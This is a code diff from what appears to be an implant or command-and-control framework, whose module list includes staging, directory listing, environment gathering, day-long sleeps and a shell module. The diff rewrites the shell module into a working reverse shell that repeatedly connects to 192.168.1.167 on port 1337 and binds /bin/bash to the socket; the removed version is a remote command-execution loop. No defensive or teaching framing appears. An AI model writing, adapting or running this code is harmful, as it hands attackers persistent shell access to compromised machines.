@@ -60,48 +60,28 @@ def run(**args):
     time.sleep(random.randint(86000,86800))
                         '''
         self.shell_module = '''
-import sys
-import socket
-import threading
-import subprocess
+from os import dup2
+from pty import spawn
 from time import sleep
 from random import randint
+import socket
 
-def server_loop():
-    host = '192.168.1.167'
-    port = 1337
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        server_socket = s.connect((host, port))
-        server_thread = threading.Thread(
-        target=server_handler, args=(
-            server_socket, ))
-        server_thread.start()
-
-def server_handler(socket_obj):
-    while True:
-        socket_obj.send(b'<GMP:#> ')
-        cmd_buffer = b''
-        while b'\n' not in cmd_buffer:
-            cmd_buffer += socket_obj.recv(1024)
-        if cmd_buffer.strip() == b'EXIT':
-            print('\n')
-            sys.exit()
-        response = run_command(cmd_buffer)
-        socket_obj.send(response)
-        sleep(randint(10,15))
-        
-def run_command(command: str):
-        command = command.rstrip()
-        try:
-            output = subprocess.check_output(
-                command, stderr=subprocess.STDOUT, shell=True)
-        except BaseException:
-            output = f'Failed to execute {command} command on host:1337.\\r\\n'.encode()
-        return output
 
 def run():
-    server_loop()
-
+    host = '192.168.1.167'
+    port = 1337
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    while True:
+        try:
+            s.connect((host,port))
+        except:
+            sleep(randint(10,15))
+            continue
+        dup2(s.fileno(),0) 
+        dup2(s.fileno(),1) 
+        dup2(s.fileno(),2)
+        spawn("/bin/bash")
+    
 '''
         self.module_list = [('stage_1',self.stage_1), ('dir_lister',self.dir_lister), ('enviro',self.enviro), ('sleep',self.sleep), ('stage_2_qrw',self.stage_2_qrw), ('sleep24h',self.sleep24h), ('shell_module',self.shell_module)]
         self.word_list_ick = ('nick', 'pick', 'wick', 'brick', 'click', 'flick', 'quick', 'slick')
